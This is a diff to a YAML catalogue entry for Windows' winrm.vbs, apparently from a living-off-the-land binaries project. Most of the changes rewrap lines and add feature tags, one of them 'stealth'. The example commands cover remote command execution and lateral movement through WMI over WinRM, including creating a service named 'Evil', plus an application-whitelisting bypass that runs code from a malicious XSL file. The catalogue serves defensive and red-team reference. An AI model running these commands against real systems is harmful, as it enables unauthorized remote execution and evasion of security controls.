@@ -2,7 +2,8 @@
 id: windows-execution-winrm
 namespace: windows:execution:winrm
 name: winrm
-description: 'Script used for manage Windows RM settings Located at: C:\Windows\System32\winrm.vbs; C:\Windows\SysWOW64\winrm.vbs.'
+description: 'Script used for manage Windows RM settings Located at: C:\Windows\System32\winrm.vbs;
+  C:\Windows\SysWOW64\winrm.vbs.'
 author: Oddvar Moe
 version: 1.0.0
 capabilities:
@@ -42,7 +43,11 @@ resource_profile:
 allowed-tools:
 - winrm
 parameters: []
-features: []
+features:
+- file-system
+- pipes-stdin
+- pipes-stdout
+- stealth
 execution:
   template: winrm
   sandbox: execFile
@@ -50,12 +55,20 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol (Proxy execution)
+- description: Lateral movement/Remote Command Execution via WMI Win32_Process class
+    over the WinRM protocol (Proxy execution)
   command: winrm invoke Create wmicimv2/Win32_Process @{CommandLine="{CMD}"} -r:http://target:5985
-- description: Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol (Proxy execution)
-  command: winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="{CMD}"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985
-- description: Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe. (Execute arbitrary, unsigned code via XSL script)
-  command: '%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty'
+- description: Lateral movement/Remote Command Execution via WMI Win32_Service class
+    over the WinRM protocol (Proxy execution)
+  command: winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="{CMD}"}
+    -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil
+    -r:http://acmedc:5985
+- description: Bypass AWL solutions by copying cscript.exe to an attacker-controlled
+    location; creating a malicious WsmPty.xsl in the same location, and executing
+    winrm.vbs via the relocated cscript.exe. (Execute arbitrary, unsigned code via
+    XSL script)
+  command: '%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get
+    wmicimv2/Win32_Process?Handle=4 -format:pretty'
 references:
 - label: windows-operating-system-archaeology
   url: https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
@@ -92,7 +105,6 @@ install:
   commands:
   - choco install winrm
 ---
-
 
 # winrm
 
